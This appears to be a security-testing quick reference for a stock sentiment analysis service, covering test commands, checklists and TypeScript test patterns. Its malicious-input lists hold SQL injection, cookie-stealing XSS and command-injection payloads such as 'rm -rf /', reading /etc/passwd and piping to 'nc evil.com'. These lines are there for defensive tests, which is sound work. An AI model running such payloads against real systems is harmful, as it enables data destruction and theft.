# VFR Security Testing Quick Reference

## Test Execution Commands

```bash
# Run all SentimentAnalysisService security tests
npm test -- SentimentAnalysisService.security.test.ts

# Run specific OWASP category tests
npm test -- --testNamePattern="OWASP A03: Injection"

# Run with increased memory for security tests
npm test -- SentimentAnalysisService.security.test.ts --maxWorkers=1

# Generate security test coverage
npm run test:coverage -- --testPathPattern=security
```

## Key Security Validation Points

### Input Sanitization Checklist

- [ ] SQL injection prevention (`'; DROP TABLE users; --`)
- [ ] XSS prevention (`<script>alert("XSS")</script>`)
- [ ] Command injection prevention (`; cat /etc/passwd`)
- [ ] Path traversal prevention (`../../../etc/passwd`)
- [ ] NoSQL injection prevention (`{"$ne": null}`)

### API Key Security Checklist

- [ ] No API keys in console output
- [ ] No API keys in error messages
- [ ] No API keys in cache data
- [ ] No API keys in response data
- [ ] Production error message sanitization

### Rate Limiting Validation

- [ ] Minimum delays enforced between requests
- [ ] Concurrent request handling
- [ ] Rate limit state persistence
- [ ] Circuit breaker functionality

## Critical Security Test Patterns

### Console Output Monitoring

```typescript
// Capture and validate console output for sensitive data
const originalConsoleError = console.error;
const capturedLogs: string[] = [];

console.error = (...args: any[]) => {
	capturedLogs.push(args.join(" "));
};

try {
	// Test execution
	await sentimentService.analyzeStockSentimentImpact(maliciousInput, "Tech", 0.75);

	// Validate no sensitive data in logs
	const allLogs = capturedLogs.join(" ");
	expect(allLogs).not.toContain("api_key");
	expect(allLogs).not.toMatch(/[a-f0-9]{32}/); // NewsAPI key pattern
} finally {
	console.error = originalConsoleError;
}
```

### Injection Attack Testing

```typescript
// Comprehensive injection payload testing
const injectionPayloads = [
	"'; DROP TABLE users; --", // SQL injection
	'<script>alert("XSS")</script>', // XSS
	"AAPL; cat /etc/passwd", // Command injection
	"../../../etc/passwd", // Path traversal
	'{"$ne": null}', // NoSQL injection
];

for (const payload of injectionPayloads) {
	const result = await sentimentService.analyzeStockSentimentImpact(payload, "Tech", 0.75);
	expect(result).toBeNull(); // Should reject all malicious inputs
}
```

### Security State Validation

```typescript
// Monitor security state throughout testing
const initialState = SecurityValidator.getSecurityStatus();
// ... execute tests ...
const finalState = SecurityValidator.getSecurityStatus();
expect(typeof finalState).toBe("object");
expect(finalState.totalRequests).toBeGreaterThan(initialState.totalRequests);
```

## Test Data Sets

### Legitimate Stock Symbols

```typescript
const legitimateSymbols = ["AAPL", "MSFT", "GOOGL", "AMZN", "TSLA", "META", "NFLX"];
```

### Malicious Input Patterns

```typescript
const sqlInjection = [
	"'; DROP TABLE sentiment_data; --",
	"' UNION SELECT api_key FROM config; --",
	"'; DELETE FROM cache WHERE 1=1; --",
];

const xssPayloads = [
	'<script>alert("XSS")</script>',
	"<img src=x onerror=alert(document.cookie)>",
	'<iframe src="javascript:alert(1)"></iframe>',
];

const commandInjection = ["AAPL; cat /etc/passwd", "AAPL && rm -rf /", "AAPL | nc evil.com 1234"];
```

## Security Test Timing

### Rate Limiting Tests

```typescript
const startTime = Date.now();
// Execute multiple requests
const totalTime = Date.now() - startTime;
expect(totalTime).toBeGreaterThan(200); // Minimum delay enforced
```

### Timeout Security

```typescript
// Test with very short timeout to simulate attacks
const timeoutAPI = new NewsAPI(process.env.NEWSAPI_KEY, 50, false);
const result = await timeoutAPI.getNewsSentiment("AAPL", "1d");
// Should timeout quickly without hanging
```

## Environment-Specific Testing

### Development Mode

```typescript
process.env.NODE_ENV = "development";
// Detailed error messages allowed in dev
```

### Production Mode

```typescript
const originalNodeEnv = process.env.NODE_ENV;
process.env.NODE_ENV = "production";
try {
	// Test production error sanitization
} finally {
	process.env.NODE_ENV = originalNodeEnv;
}
```

## Security Test Maintenance

### Monthly Security Updates

1. Update injection payload patterns
2. Review OWASP Top 10 changes
3. Add new attack vectors from threat intelligence
4. Validate test coverage remains comprehensive

### Security Test Checklist

- [ ] All OWASP Top 10 categories covered
- [ ] Real data used (no mocks)
- [ ] API key protection validated
- [ ] Rate limiting enforced
- [ ] Error message sanitization working
- [ ] Cache security verified
- [ ] Input validation comprehensive
- [ ] Output sanitization complete

## Common Security Test Failures

### API Key Exposure

**Symptom**: Test fails with API key visible in logs
**Solution**: Enhance SecurityValidator.sanitizeErrorMessage()

### Rate Limiting Bypass

**Symptom**: Requests complete too quickly
**Solution**: Check rate limiting implementation in NewsAPI

### Injection Success

**Symptom**: Malicious input not rejected
**Solution**: Enhance input validation in SecurityValidator

### Cache Poisoning

**Symptom**: Sensitive data found in cache
**Solution**: Add sanitization before cache storage

## Security Testing Best Practices

1. **Always Use Real Data**: Never mock security-sensitive components
2. **Test Edge Cases**: Include boundary conditions and unusual inputs
3. **Monitor All Output**: Capture console, error, and response data
4. **Validate State Changes**: Ensure security state remains stable
5. **Test Under Load**: Validate security during concurrent requests
6. **Document Failures**: Record and analyze all security test failures
